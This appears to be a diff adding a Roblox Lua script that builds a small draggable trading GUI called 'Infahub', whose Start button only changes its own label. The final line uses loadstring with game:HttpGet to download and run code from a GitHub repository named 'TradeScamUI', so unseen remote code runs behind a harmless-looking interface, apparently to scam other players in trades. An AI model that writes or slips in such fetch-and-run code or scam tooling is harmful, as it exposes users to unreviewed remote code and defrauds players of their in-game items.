@@ -1,0 +1,96 @@
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Parent = screenGui
+mainFrame.Size = UDim2.new(0, 200, 0, 120)
+mainFrame.Position = UDim2.new(0.5, -100, 0.5, -60)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.ClipsDescendants = true
+
+local uiCorner = Instance.new("UICorner")
+uiCorner.Parent = mainFrame
+uiCorner.CornerRadius = UDim.new(0, 10)
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Parent = mainFrame
+titleLabel.Size = UDim2.new(1, 0, 0, 40)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Infahub"
+titleLabel.TextColor3 = Color3.fromRGB(255, 204, 0)
+titleLabel.TextSize = 20
+titleLabel.Font = Enum.Font.SourceSansBold
+
+local statusTextBox = Instance.new("TextBox")
+statusTextBox.Parent = mainFrame
+statusTextBox.Size = UDim2.new(0.8, 0, 0, 30)
+statusTextBox.Position = UDim2.new(0.1, 0, 0, 45)
+statusTextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+statusTextBox.Text = "Waiting Trade..."
+statusTextBox.TextColor3 = Color3.fromRGB(200, 200, 200)
+statusTextBox.TextSize = 16
+statusTextBox.Font = Enum.Font.SourceSans
+statusTextBox.ClearTextOnFocus = false
+
+local textBoxCorner = Instance.new("UICorner")
+textBoxCorner.Parent = statusTextBox
+textBoxCorner.CornerRadius = UDim.new(0, 6)
+
+local startButton = Instance.new("TextButton")
+startButton.Parent = mainFrame
+startButton.Size = UDim2.new(0.8, 0, 0, 30)
+startButton.Position = UDim2.new(0.1, 0, 0, 85)
+startButton.BackgroundColor3 = Color3.fromRGB(255, 204, 0)
+startButton.Text = "Start"
+startButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+startButton.TextSize = 18
+startButton.Font = Enum.Font.SourceSansBold
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.Parent = startButton
+buttonCorner.CornerRadius = UDim.new(0, 6)
+
+startButton.MouseButton1Click:Connect(function()
+    local tradeStatus = statusTextBox.Text
+    print("Trade status:", tradeStatus)
+    statusTextBox.Text = "Trade Started!"
+end)
+
+local dragging = false
+local dragInput, mousePos, framePos
+
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        mousePos = input.Position
+        framePos = mainFrame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - mousePos
+        mainFrame.Position = UDim2.new(
+            framePos.X.Scale,
+            framePos.X.Offset + delta.X,
+            framePos.Y.Scale,
+            framePos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TheTippyOmega/TradeScamUI/refs/heads/main/main'))()
